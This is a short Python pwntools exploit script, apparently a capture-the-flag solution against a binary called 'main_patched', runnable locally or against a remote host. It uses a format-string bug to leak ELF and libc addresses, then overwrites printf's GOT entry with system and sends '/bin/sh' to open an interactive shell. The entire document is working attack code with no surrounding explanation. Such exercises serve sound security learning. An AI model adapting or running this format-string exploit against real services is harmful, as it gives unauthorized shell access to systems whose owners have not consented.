#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)

exe = "./main_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process([exe], aslr=True)

io.sendline(b"|%37$p|%3$p|")
io.recvuntil(b"|")
leaks = io.recvline().split(b"|")

elf.address = hexleak(leaks[0]) - 0x10e0
info("elf  @ %#x" % elf.address)

libc.address = hexleak(leaks[1]) - 0x10e1f2
info("libc @ %#x" % libc.address)

payload = fmtstr_payload(6, {elf.got.printf: libc.sym.system})
io.sendline(payload)
io.sendline(b"/bin/sh")
io.clean()

io.interactive()
